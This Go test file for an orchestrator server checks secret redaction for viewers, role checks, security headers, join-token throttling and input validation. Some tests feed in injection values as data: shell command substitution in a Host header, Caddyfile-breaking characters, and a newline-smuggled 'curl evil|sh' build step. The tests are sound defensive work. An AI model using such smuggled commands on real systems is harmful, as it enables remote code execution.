package server

import (
	"io"
	"net/http"
	"strings"
	"testing"

	"github.com/Maffewem/Orchestrator/internal/api"
)

// Viewers can read projects, but the environment values (secrets) are blanked for them.
func TestViewerDoesNotSeeEnvValues(t *testing.T) {
	h := newHarness(t)
	reg := h.register("pi")
	var p ProjectView
	code := h.do("POST", "/api/projects", adminToken, map[string]any{
		"name": "app", "device_id": reg.DeviceID,
		"source":  map[string]any{"type": "image", "image": "nginx:alpine"},
		"runtime": map[string]any{"env": []string{"DB_PASSWORD=hunter2", "MODE=prod"}},
	}, &p)
	if code != http.StatusCreated {
		t.Fatalf("create: %d", code)
	}
	viewer, operator := h.makeUser("viewer1", "viewer"), h.makeUser("operator1", "operator")

	check := func(tok string, secret bool) {
		t.Helper()
		var list []ProjectView
		var one ProjectView
		h.do("GET", "/api/projects", tok, nil, &list)
		h.do("GET", "/api/projects/"+p.ID, tok, nil, &one)
		for _, env := range [][]string{list[0].Runtime.Env, one.Runtime.Env} {
			if len(env) != 2 || env[0] == "DB_PASSWORD=hunter2" != secret {
				t.Fatalf("env = %v, secret visible should be %v", env, secret)
			}
			if !secret && (env[0] != "DB_PASSWORD=" || env[1] != "MODE=") {
				t.Fatalf("viewer env = %v", env)
			}
		}
	}
	check(viewer, false)
	check(operator, true)
	check(adminToken, true)

	// Viewing must not change what is stored.
	var again ProjectView
	h.do("GET", "/api/projects/"+p.ID, adminToken, nil, &again)
	if again.Runtime.Env[0] != "DB_PASSWORD=hunter2" {
		t.Fatalf("stored env changed: %v", again.Runtime.Env)
	}

	// Command records carry deploy specs and inspect output, so they are operator-only.
	cmd, err := h.st.CreateCommand(t.Context(), reg.DeviceID, api.ActionLogs, "x", nil)
	if err != nil {
		t.Fatal(err)
	}
	if code := h.do("GET", "/api/commands/"+cmd.ID, viewer, nil, nil); code != http.StatusForbidden {
		t.Fatalf("viewer read a command: %d", code)
	}
	if code := h.do("GET", "/api/commands/"+cmd.ID, operator, nil, nil); code != http.StatusOK {
		t.Fatalf("operator command: %d", code)
	}
}

// The installer is a shell script with the host inside double quotes: a forged Host header
// must never reach it.
func TestInstallScriptRefusesHostInjection(t *testing.T) {
	h := newHarness(t)
	get := func(host string) (int, string) {
		req, _ := http.NewRequest("GET", h.ts.URL+"/install.sh", nil)
		req.Host = host
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()
		b, _ := io.ReadAll(resp.Body)
		return resp.StatusCode, string(b)
	}
	for _, bad := range []string{`a$(id);b`, "a`id`", `a"b`, "a;b", "a b"} {
		if code, body := get(bad); code != http.StatusBadRequest || strings.Contains(body, "id") && strings.Contains(body, bad) {
			t.Errorf("host %q: %d", bad, code)
		}
	}
	for _, ok := range []string{"orch.example.com", "192.168.1.5:8080", "[::1]:8080", "localhost"} {
		if code, body := get(ok); code != http.StatusOK || !strings.Contains(body, `SERVER="http://`+ok+`"`) {
			t.Errorf("host %q: %d", ok, code)
		}
	}
}

// Route paths are written into the Caddyfile.
func TestRoutePathCannotInjectCaddyConfig(t *testing.T) {
	for _, bad := range []string{"/a\tb", "/a\rb", "/a\"b", "/a`b", "/a#b", "/a}b", "/a{b", "/a b", "a", "/a\nb"} {
		if routePathRE.MatchString(bad) {
			t.Errorf("%q accepted", bad)
		}
	}
	for _, ok := range []string{"/", "/api/*", "/v1/users", "/a-b_c.d"} {
		if !routePathRE.MatchString(ok) {
			t.Errorf("%q refused", ok)
		}
	}
}

func TestSecurityHeadersAndJoinThrottle(t *testing.T) {
	h := newHarness(t)
	resp, err := http.Get(h.ts.URL + "/api/health")
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.Header.Get("X-Frame-Options") != "DENY" || !strings.Contains(resp.Header.Get("Content-Security-Policy"), "frame-ancestors 'none'") || resp.Header.Get("X-Content-Type-Options") != "nosniff" {
		t.Fatalf("missing headers: %v", resp.Header)
	}

	for i := 0; i < maxFailures; i++ {
		if code := h.do("POST", "/api/agent/register", "", api.RegisterRequest{JoinToken: "guess"}, nil); code != http.StatusUnauthorized {
			t.Fatalf("guess %d: %d", i, code)
		}
	}
	var settings struct {
		JoinToken string `json:"join_token"`
	}
	h.do("GET", "/api/settings", adminToken, nil, &settings)
	if code := h.do("POST", "/api/agent/register", "", api.RegisterRequest{JoinToken: settings.JoinToken}, nil); code != http.StatusTooManyRequests {
		t.Fatalf("expected the join token to be throttled after repeated guesses: %d", code)
	}
}

func TestSSOFlowTableIsBounded(t *testing.T) {
	var st ssoState
	for i := 0; i < maxSSOFlows; i++ {
		if st.putFlow(ssoFlow{provider: "oidc"}) == "" {
			t.Fatalf("flow %d refused too early", i)
		}
	}
	if st.putFlow(ssoFlow{provider: "oidc"}) != "" {
		t.Fatal("flow table grew past its cap")
	}
}

func TestNodeCommandsMustBeSingleLine(t *testing.T) {
	for _, n := range []api.NodeSpec{{Install: "npm ci\nRUN curl evil|sh"}, {Build: "x\r\ny"}, {Start: "node a.js\nCMD x"}} {
		n := n
		if err := cleanNode(&n); err == nil {
			t.Errorf("%+v accepted", n)
		}
	}
	ok := api.NodeSpec{Install: "npm ci", Build: "npm run build", Start: "npm start"}
	if err := cleanNode(&ok); err != nil {
		t.Fatal(err)
	}
}
